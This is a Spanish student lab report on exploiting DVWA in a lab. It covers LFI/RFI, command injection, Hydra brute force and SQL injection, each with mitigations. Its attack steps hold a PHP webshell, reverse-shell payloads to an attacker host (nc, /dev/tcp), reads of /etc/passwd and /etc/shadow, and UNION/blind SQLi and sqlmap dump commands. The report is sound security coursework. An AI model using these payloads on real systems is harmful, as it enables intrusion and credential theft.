# INFORME #2 — Gestión de Vulnerabilidades en Aplicaciones
**DVWA: File Inclusion | Command Injection | Brute Force | SQL Injection**

**Estudiante:** Daniel Aguirre  
**Asignatura:** Gestión de Vulnerabilidades en Aplicaciones  
**Docente:** Javier Mauricio Durán Vásquez  
**Fecha de entrega:** 14 de marzo de 2026  
**Plataforma:** DVWA (Damn Vulnerable Web Application) — Nivel Low  

---

## Entorno de trabajo

| Elemento | Detalle |
|---|---|
| Sistema atacante | Kali Linux (VM) — prompt: `danielaguirre@kali:~$` |
| Sistema víctima | Metasploitable (VM) con DVWA preinstalado |
| Red | Red interna entre VMs (sin Internet requerido) |
| Nivel DVWA | Low |
| Herramientas | Navegador Firefox, Metasploit, Hydra, sqlmap, Burp Suite |

---

## Vulnerabilidad 5 — File Inclusion (LFI / RFI)

### 1. Descripción de la vulnerabilidad

La inclusión de archivos (File Inclusion) ocurre cuando una aplicación web utiliza
parámetros controlables por el usuario para construir la ruta de un archivo que
luego incluye y ejecuta dinámicamente. Existen dos variantes:

- **LFI (Local File Inclusion):** el atacante referencia archivos que ya existen en
  el sistema de archivos local del servidor (ej. `/etc/passwd`).
- **RFI (Remote File Inclusion):** el atacante apunta a un archivo alojado en un
  servidor externo, el cual es descargado y ejecutado en el servidor víctima.

En ambos casos la raíz del problema es que la aplicación construye dinámicamente
rutas de archivo con datos que provienen del usuario, sin verificar ni restringir
qué archivos pueden ser incluidos.

---

### 2. Causas de la vulnerabilidad

#### a. Ausencia de validaciones

El parámetro `page` en DVWA nivel Low se pasa directamente a `include()` sin ningún
tipo de lista blanca ni verificación de ruta:

```php
// Código vulnerable en DVWA nivel Low
$file = $_GET['page'];
include($file);
```

No se comprueba si el valor viene de un conjunto permitido de páginas, ni si
contiene secuencias de traversal de directorios como `../`.

#### b. Errores de lógica

La aplicación asume que el usuario solo ingresará uno de los archivos esperados
(`include1.php`, `include2.php`, etc.). Esta confianza implícita en la entrada es
un error de diseño: el modelo de seguridad se basa en lo que el usuario *debería*
hacer, no en lo que *puede* hacer.

#### c. Manejo inadecuado de entradas y salidas

- La URL `?page=../../../../../etc/passwd` es aceptada sin sanitización.
- Para RFI, la directiva `allow_url_include = On` en `php.ini` permite que `include()`
  acepte URLs remotas. En DVWA nivel Low esta opción está habilitada.
- El contenido del archivo externo se ejecuta en el contexto del servidor, no se
  muestra como texto plano.

---

### 3. Mecanismo de ataque

#### Ataque LFI — Lectura de archivos locales

**Objetivo:** Leer el archivo `/etc/passwd` del servidor víctima para enumerar usuarios del sistema.

**Paso 1 — Identificar el parámetro vulnerable:**

Navegar a la sección File Inclusion en DVWA. La URL inicial es:
```
http://<IP_VICTIMA>/dvwa/vulnerabilities/fi/?page=include.php
```
El parámetro `page` es el vector de ataque.

**Paso 2 — Payload LFI con path traversal:**
```
http://<IP_VICTIMA>/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```
El servidor responde mostrando el contenido de `/etc/passwd` en el cuerpo de la
página, revelando usuarios del sistema operativo (root, daemon, www-data, etc.).

**Paso 3 — Escalada: leer archivos de configuración sensibles:**
```
http://<IP_VICTIMA>/dvwa/vulnerabilities/fi/?page=../../../../var/www/html/dvwa/config/config.inc.php
```
Esto puede revelar credenciales de base de datos (usuario y contraseña de MySQL).

> **[IMAGEN 1 — LFI mostrando /etc/passwd — fecha visible en prompt Kali]**

---

#### Ataque RFI — Ejecución remota de código

**Objetivo:** Alojar un archivo PHP malicioso en la máquina atacante y lograr que el
servidor víctima lo descargue y ejecute, obteniendo ejecución remota de comandos.

**Paso 1 — Crear webshell en Kali:**
```bash
danielaguirre@kali:~$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Paso 2 — Servir el archivo por HTTP:**
```bash
danielaguirre@kali:~$ python3 -m http.server 8888
```

**Paso 3 — Payload RFI apuntando a la máquina atacante:**
```
http://<IP_VICTIMA>/dvwa/vulnerabilities/fi/?page=http://<IP_KALI>:8888/shell.php&cmd=id
```
El servidor víctima descarga `shell.php` desde Kali, lo ejecuta como PHP y
devuelve en la respuesta el resultado del comando `id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Paso 4 — Escalar a reverse shell:**
```
?page=http://<IP_KALI>:8888/shell.php&cmd=nc -e /bin/bash <IP_KALI> 4444
```
Con un listener previo en Kali (`nc -lvnp 4444`), se obtiene una shell interactiva.

> **[IMAGEN 2 — RFI ejecutando comando `id` en el servidor víctima]**  
> **[IMAGEN 3 — Shell reversa recibida en Netcat]**

---

### 4. Clasificación técnica

| Referencia | Detalle |
|---|---|
| **CWE-22** | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') — aplica a LFI |
| **CWE-98** | Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion') — aplica a RFI |
| **CVE-2018-16986** | Ejemplo histórico de LFI en aplicaciones PHP mal configuradas |
| **OWASP Top 10** | A03:2021 — Injection / A05:2021 — Security Misconfiguration |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | ALTO — LFI permite leer archivos de configuración, claves privadas, credenciales y código fuente del servidor. |
| **Integridad** | ALTO — RFI permite ejecutar código arbitrario; puede modificar, crear o eliminar archivos del servidor. |
| **Disponibilidad** | ALTO — A través de RFI se puede interrumpir el servicio, cifrar datos (ransomware) o eliminar archivos críticos. |

En un entorno real, la combinación LFI + RFI equivale a comprometer completamente
el servidor web: acceso a credenciales, modificación de contenido, instalación de
backdoors y pivote hacia otros sistemas de la red interna.

---

### 6. Propuesta de mitigación

1. **Lista blanca de archivos permitidos:** definir un array de páginas válidas y
   verificar que el parámetro coincida exactamente.
   ```php
   $allowed = ['include1.php', 'include2.php', 'include3.php'];
   if (in_array($_GET['page'], $allowed)) {
       include($_GET['page']);
   }
   ```
2. **Deshabilitar `allow_url_include`** en `php.ini` (`allow_url_include = Off`).
3. **Sanitizar rutas:** eliminar `../`, `..\` y secuencias de null byte (`%00`).
4. **Principio de mínimo privilegio:** el proceso del servidor web no debe poder
   leer archivos fuera del webroot.
5. **WAF (Web Application Firewall):** bloquear patrones de path traversal en las
   URLs entrantes.

---
---

## Vulnerabilidad 6 — Command Injection (Ejecución de Comandos)

### 1. Descripción de la vulnerabilidad

La inyección de comandos ocurre cuando una aplicación pasa datos controlados por el
usuario directamente a un intérprete del sistema operativo (shell), sin sanitizar los
caracteres de separación de comandos. El atacante puede encadenar comandos adicionales
al comando legítimo de la aplicación, logrando que el sistema operativo del servidor
los ejecute con los privilegios del proceso web (`www-data`).

---

### 2. Causas de la vulnerabilidad

#### a. Ausencia de validaciones

DVWA nivel Low pasa el input directamente a `shell_exec()` o `passthru()` sin ningún
filtro:

```php
// Código vulnerable en DVWA nivel Low
$target = $_REQUEST['ip'];
$cmd = shell_exec('ping -c 4 ' . $target);
echo $cmd;
```

No se verifica que `$target` sea una dirección IP válida.

#### b. Errores de lógica

La función de "ping" fue diseñada para recibir una IP. El error de lógica es
concatenar directamente el input del usuario al comando del SO sin tratar esa
concatenación como potencialmente peligrosa. La aplicación no distingue entre datos
y código ejecutable.

#### c. Manejo inadecuado de entradas

Los metacaracteres de shell como `;`, `&&`, `||`, `|`, `` ` `` y `$()` no son
escapados ni eliminados. Esto permite al atacante inyectar comandos adicionales usando
estos separadores.

---

### 3. Mecanismo de ataque

**Objetivo:** Ejecutar comandos arbitrarios del sistema operativo en el servidor víctima
a través del campo de ping en DVWA.

**Paso 1 — Uso legítimo (baseline):**

En el campo IP se ingresa `127.0.0.1` → la aplicación ejecuta `ping -c 4 127.0.0.1`
y muestra el resultado.

**Paso 2 — Inyección con separador `;` (ejecución secuencial):**
```
127.0.0.1 ; id
```
Comando resultante en el servidor: `ping -c 4 127.0.0.1 ; id`  
La respuesta incluye el resultado del ping Y el resultado de `id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **[IMAGEN 4 — Command injection con `;id` mostrando uid del servidor]**

**Paso 3 — Enumeración del sistema:**
```
127.0.0.1 ; uname -a
127.0.0.1 ; cat /etc/passwd
127.0.0.1 ; ls /var/www/html/dvwa/
```

**Paso 4 — Reverse shell mediante inyección:**
```bash
# En Kali, abrir listener
danielaguirre@kali:~$ nc -lvnp 4444

# Payload inyectado en el campo IP de DVWA:
127.0.0.1 ; bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1
```
Resultado: shell interactiva del servidor en la consola de Kali.

> **[IMAGEN 5 — Reverse shell obtenida via Command Injection]**

**Alternativa con operador `&&` (ejecutar si el primero exitoso):**
```
127.0.0.1 && whoami && cat /etc/shadow
```

---

### 4. Clasificación técnica

| Referencia | Detalle |
|---|---|
| **CWE-78** | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') |
| **CVE-2014-6271** | Shellshock — vulnerabilidad de command injection en Bash (impacto masivo real) |
| **OWASP Top 10** | A03:2021 — Injection |
| **CVSS v4.0 (base)** | ~9.8 Critical — acceso remoto sin autenticación a comandos del SO |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | CRÍTICO — Lectura de cualquier archivo accesible por el proceso web: claves SSH, credenciales de BD, código fuente. |
| **Integridad** | CRÍTICO — Escritura y modificación de archivos, instalación de malware, creación de usuarios del SO. |
| **Disponibilidad** | CRÍTICO — Apagado del servidor, eliminación de archivos del sistema, denegación de servicio. |

Command Injection es considerada una de las vulnerabilidades más críticas porque
el atacante obtiene capacidades equivalentes a las del proceso web en el sistema
operativo, no solo en la aplicación.

---

### 6. Propuesta de mitigación

1. **Evitar completamente llamadas al SO:** usar funciones nativas del lenguaje en
   lugar de `shell_exec()`, `exec()`, `system()`. Para ping, usar librerías de red.
2. **Si es indispensable:** validar el input con expresión regular estricta antes de
   pasarlo al comando:
   ```php
   if (preg_match('/^(\d{1,3}\.){3}\d{1,3}$/', $target)) {
       $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));
   }
   ```
3. **`escapeshellarg()`:** envuelve el argumento en comillas simples y escapa las
   comillas internas, impidiendo la inyección de metacaracteres.
4. **Principio de mínimo privilegio:** el proceso web no debe tener permisos de
   escritura ni acceso a archivos sensibles del SO.
5. **WAF:** bloquear patrones de inyección (`;`, `&&`, `||`, `|`, backticks).

---
---

## Vulnerabilidad 7 — Brute Force (Fuerza Bruta)

### 1. Descripción de la vulnerabilidad

Un ataque de fuerza bruta sobre autenticación consiste en intentar sistemáticamente
todas las combinaciones posibles de credenciales (usuario/contraseña) hasta encontrar
las válidas. La vulnerabilidad existe cuando la aplicación no implementa ningún
mecanismo que limite o detecte estos intentos repetidos de login. Es un ataque de
bajo sofisticación técnica pero de alto impacto cuando las credenciales son débiles.

---

### 2. Causas de la vulnerabilidad

#### a. Ausencia de validaciones

DVWA nivel Low no implementa:
- Límite de intentos fallidos (lockout).
- CAPTCHA.
- Tiempo de espera entre intentos (rate limiting).
- Detección de comportamiento anómalo.

```php
// Lógica vulnerable simplificada
$user = $_GET['username'];
$pass = $_GET['password'];
$query = "SELECT * FROM users WHERE user='$user' AND password=md5('$pass')";
// Sin contador de intentos fallidos, sin lockout
```

#### b. Errores de lógica

El formulario de login de DVWA usa método **GET**, lo que significa que las
credenciales viajan en la URL. Esto facilita enormemente la automatización del
ataque: cualquier herramienta HTTP puede repetir la petición modificando los
parámetros directamente en la URL.

#### c. Manejo inadecuado de entradas

Las contraseñas están hasheadas con **MD5** — algoritmo criptográficamente roto
y sin salt. Los hashes obtenidos de la BD son trivialmente crackeables con
tablas arcoíris o diccionarios precomputados. Además, no existe mecanismo de
bloqueo por IP o por cuenta tras N intentos.

---

### 3. Mecanismo de ataque

**Objetivo:** Obtener las credenciales válidas del panel de login de DVWA mediante
un ataque de diccionario con Hydra.

**Paso 1 — Analizar la petición de login con Burp Suite / F12:**

Al hacer login fallido, la URL resultante es:
```
http://<IP>/dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login
```
Respuesta en caso fallido: `Username and/or password incorrect.`

**Paso 2 — Ataque con Hydra (diccionario):**
```bash
danielaguirre@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <IP_VICTIMA> http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"
```

Desglose del comando:
- `-l admin` → usuario fijo `admin`
- `-P rockyou.txt` → wordlist de contraseñas
- `http-get-form` → módulo para formularios GET
- La cadena de configuración tiene tres partes separadas por `:` → ruta, parámetros, mensaje de fallo

**Resultado:** Hydra encuentra la contraseña `password` para el usuario `admin` en pocos segundos.

> **[IMAGEN 6 — Hydra encontrando credenciales válidas: admin/password]**

**Paso 3 — Verificación manual:**

Ingresar `admin` / `password` en el formulario → login exitoso con mensaje de bienvenida.

> **[IMAGEN 7 — Login exitoso con credenciales obtenidas por fuerza bruta]**

**Variante con Medusa:**
```bash
danielaguirre@kali:~$ medusa -h <IP_VICTIMA> -u admin -P /usr/share/wordlists/rockyou.txt \
  -m WEB-FORM -f "/dvwa/vulnerabilities/brute/" \
  -F -e ns
```

---

### 4. Clasificación técnica

| Referencia | Detalle |
|---|---|
| **CWE-307** | Improper Restriction of Excessive Authentication Attempts |
| **CWE-916** | Use of Password Hash With Insufficient Computational Effort (MD5 sin salt) |
| **CWE-521** | Weak Password Requirements |
| **OWASP Top 10** | A07:2021 — Identification and Authentication Failures |
| **CVSS v4.0** | ~7.5 High (red interna) / ~9.8 Critical (exposición pública) |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | ALTO — Acceso a información privada del usuario comprometido: datos personales, historial, mensajes. |
| **Integridad** | ALTO — El atacante puede modificar datos, configuraciones o realizar transacciones en nombre de la víctima. |
| **Disponibilidad** | MEDIO — En sistemas con lockout (que DVWA no tiene), el atacante puede bloquear cuentas legítimas causando DoS. |

En un banco o sistema de salud real, el compromiso de una cuenta de administrador
mediante fuerza bruta puede implicar violaciones masivas de datos y consecuencias
legales bajo regulaciones como GDPR o la Ley 1581 de Colombia.

---

### 6. Propuesta de mitigación

1. **Bloqueo por intentos fallidos:** bloquear la cuenta por N minutos tras 5
   intentos fallidos consecutivos.
2. **Rate limiting por IP:** limitar a N solicitudes por segundo desde la misma IP.
3. **CAPTCHA:** incorporar en el formulario de login tras 3 intentos fallidos.
4. **Autenticación multifactor (MFA):** incluso si la contraseña es comprometida,
   el segundo factor protege la cuenta.
5. **Algoritmos de hashing seguros:** usar `bcrypt`, `argon2id` o `scrypt` con salt
   aleatorio — hacen inviable el ataque de diccionario masivo.
6. **Detección de anomalías:** alertar al equipo SOC ante múltiples intentos fallidos
   desde una IP o sobre una misma cuenta.

---
---

## Vulnerabilidad 8 — SQL Injection & SQL Injection (Blind)

### 1. Descripción de la vulnerabilidad

La inyección SQL ocurre cuando los datos ingresados por el usuario se insertan
directamente en una consulta SQL sin ser tratados como datos literales. El atacante
puede alterar la lógica de la consulta, extrayendo datos de la base de datos,
modificando registros o incluso ejecutando comandos del sistema operativo a través
del motor de base de datos.

**SQL Injection Blind:** variante en la que la aplicación no devuelve los resultados
de la consulta directamente en la respuesta, pero el atacante puede inferir
información basándose en el comportamiento de la aplicación (respuestas verdadero/falso
o tiempos de respuesta).

---

### 2. Causas de la vulnerabilidad

#### a. Ausencia de validaciones

```php
// Código vulnerable en DVWA nivel Low
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysql_query($query);
```

El valor de `$id` se concatena directamente en la query sin validación ni
parametrización. Las comillas simples del atacante cierran la cadena de la query
y permiten inyectar SQL adicional.

#### b. Errores de lógica

La aplicación construye la query dinámicamente concatenando strings. Este patrón
es fundamentalmente inseguro porque mezcla código (SQL) con datos (input del usuario).
La solución es separar siempre código de datos mediante consultas preparadas.

#### c. Manejo inadecuado de entradas y salidas

- No se usa `mysql_real_escape_string()` ni PDO con prepared statements.
- Los mensajes de error de MySQL son visibles al usuario (en nivel Low), revelando
  estructura de la base de datos, nombres de tablas y tipos de datos.
- La función `mysql_query()` está deprecada desde PHP 5.5 — su uso denota código
  antiguo y desarrollo sin prácticas de seguridad modernas.

---

### 3. Mecanismo de ataque

#### Ataque SQL Injection Manual

**Objetivo:** Extraer todos los usuarios y contraseñas de la base de datos de DVWA.

**Paso 1 — Confirmar vulnerabilidad:**

Ingresar `'` (comilla simple) en el campo ID → la aplicación muestra un error SQL:
```
You have an error in your SQL syntax...
```
Esto confirma que el input se interpreta como SQL.

**Paso 2 — Determinar número de columnas (ORDER BY):**
```
1' ORDER BY 1-- -    → funciona
1' ORDER BY 2-- -    → funciona
1' ORDER BY 3-- -    → error
```
Conclusión: la query retorna **2 columnas**.

**Paso 3 — Identificar columnas visibles (UNION SELECT):**
```
1' UNION SELECT NULL, NULL-- -
1' UNION SELECT 'a','b'-- -
```
Ambas columnas son visibles en la respuesta.

**Paso 4 — Extraer nombre de la BD y versión:**
```
1' UNION SELECT database(), version()-- -
```
Resultado: `dvwa | 5.0.51a-3ubuntu5`

> **[IMAGEN 8 — UNION SELECT mostrando nombre de BD y versión de MySQL]**

**Paso 5 — Enumerar tablas:**
```
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
```
Resultado: tablas `guestbook` y `users` en la BD `dvwa`.

**Paso 6 — Extraer columnas de la tabla users:**
```
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
```
Columnas: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`.

**Paso 7 — Extraer credenciales:**
```
1' UNION SELECT user, password FROM users-- -
```
Resultado:
```
admin    | 5f4dcc3b5aa765d61d8327deb882cf99
gordonb  | e99a18c428cb38d5f260853678922e03
1337     | 8d3533d75ae2c3966d7e0d4fcc69216b
pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7
smithy   | 5f4dcc3b5aa765d61d8327deb882cf99
```
Los hashes MD5 se crackean en segundos con CrackStation o hashcat:
- `5f4dcc3b5aa765d61d8327deb882cf99` → `password`

> **[IMAGEN 9 — Extracción completa de tabla users con hashes de contraseñas]**

---

#### Ataque SQL Injection Automatizado con sqlmap

**Objetivo:** Automatizar la extracción completa de la BD usando sqlmap.

```bash
# Paso 1 — Detectar vulnerabilidad y BD
danielaguirre@kali:~$ sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>;security=low" \
  --dbs

# Paso 2 — Extraer tablas de la BD dvwa
danielaguirre@kali:~$ sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>;security=low" \
  -D dvwa --tables

# Paso 3 — Volcar tabla users
danielaguirre@kali:~$ sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>;security=low" \
  -D dvwa -T users --dump
```

sqlmap detecta automáticamente el tipo de inyección, extrae la BD y crackea los
hashes MD5 con su diccionario incorporado.

> **[IMAGEN 10 — sqlmap volcando tabla users y crackeando hashes]**

---

#### Ataque SQL Injection Blind

**Objetivo:** Extraer información cuando la aplicación no muestra resultados directamente.

La sección "SQL Injection (Blind)" de DVWA devuelve solo:
- `User ID exists in the database.`
- `User ID is MISSING from the database.`

**Técnica Boolean-Based Blind:**
```
# ¿La primera letra del nombre de la BD es 'd'?
1' AND SUBSTRING(database(),1,1)='d'-- -    → "exists" (VERDADERO)
1' AND SUBSTRING(database(),1,1)='a'-- -    → "missing" (FALSO)
```

**Técnica Time-Based Blind:**
```
# Si la condición es verdadera, la respuesta tarda 5 segundos
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)-- -
```

**Automatización con sqlmap (blind):**
```bash
danielaguirre@kali:~$ sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>;security=low" \
  --technique=B \
  -D dvwa -T users --dump
```

> **[IMAGEN 11 — sqlmap extrayendo datos con técnica boolean-based blind]**

---

### 4. Clasificación técnica

| Referencia | Detalle |
|---|---|
| **CWE-89** | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') |
| **CWE-209** | Generation of Error Message Containing Sensitive Information |
| **CVE-2012-1823** | Ejemplo histórico de SQLi crítico en PHP-CGI |
| **OWASP Top 10** | A03:2021 — Injection (posición #1 históricamente) |
| **CVSS v4.0** | ~9.8 Critical — extracción completa de BD + posible RCE via INTO OUTFILE |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | CRÍTICO — Extracción total de la base de datos: credenciales, datos personales, información financiera, PII. |
| **Integridad** | CRÍTICO — Modificación o eliminación de registros (`UPDATE`, `DELETE`, `DROP TABLE`). |
| **Disponibilidad** | ALTO — `DROP DATABASE` o `SHUTDOWN` pueden hacer caer completamente el sistema. |

SQL Injection ha sido la causa raíz de las brechas de seguridad más grandes de
la historia (Yahoo 2012: 3 billones de cuentas; Sony Pictures 2011; RockYou 2009:
32 millones de contraseñas en texto plano). En un entorno real con datos de clientes
bajo la Ley 1581/2012 o el GDPR, implicaría multas millonarias y responsabilidad penal.

---

### 6. Propuesta de mitigación

1. **Consultas preparadas (Prepared Statements):** la defensa más efectiva. El motor
   SQL distingue siempre entre código y datos:
   ```php
   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```
2. **ORM (Object-Relational Mapping):** frameworks como Eloquent o Doctrine generan
   queries parametrizadas automáticamente.
3. **Deshabilitar mensajes de error detallados** en producción (`display_errors = Off`).
4. **Principio de mínimo privilegio en BD:** el usuario de la aplicación no debe
   tener permisos `DROP`, `CREATE` ni acceso a `information_schema`.
5. **WAF:** reglas para detectar y bloquear patrones SQLi (`UNION SELECT`, `OR 1=1`, etc.).
6. **Actualizar funciones deprecadas:** migrar de `mysql_query()` a PDO o MySQLi.

---
---

## Reflexión Personal

A lo largo de este segundo informe, las cuatro vulnerabilidades trabajadas confirman
un patrón que ya venía evidenciándose en el primero: **la confianza implícita en el
input del usuario es la causa raíz de la mayoría de vulnerabilidades críticas en
aplicaciones web.**

Lo que más impresionó durante esta práctica fue la facilidad con la que herramientas
como `sqlmap` o `hydra` automatizan ataques que de forma manual requerirían horas.
Un atacante sin conocimientos profundos puede extraer la base de datos completa de
un sistema vulnerable ejecutando un solo comando. Esto refuerza la idea de que la
seguridad no puede ser un componente que se añade al final del desarrollo; debe
estar presente desde el diseño de la arquitectura.

La diferencia entre SQL Injection blind y normal también fue reveladora: incluso
cuando la aplicación *aparentemente* no da información, un atacante paciente y con
las herramientas adecuadas puede extraer cualquier dato bit a bit. La ausencia de
mensajes de error no implica ausencia de vulnerabilidad.

Desde la perspectiva profesional, estos laboratorios establecen la base práctica
para comprender por qué marcos como OWASP Top 10, controles como los del NIST
Cybersecurity Framework y prácticas como SAST/DAST en pipelines de CI/CD son
no opcionales, sino imprescindibles en cualquier ciclo de desarrollo de software seguro.

---

*Informe elaborado sobre plataforma DVWA nivel Low como entorno controlado de aprendizaje.*  
*Todas las técnicas documentadas fueron ejecutadas exclusivamente en entornos de laboratorio.*
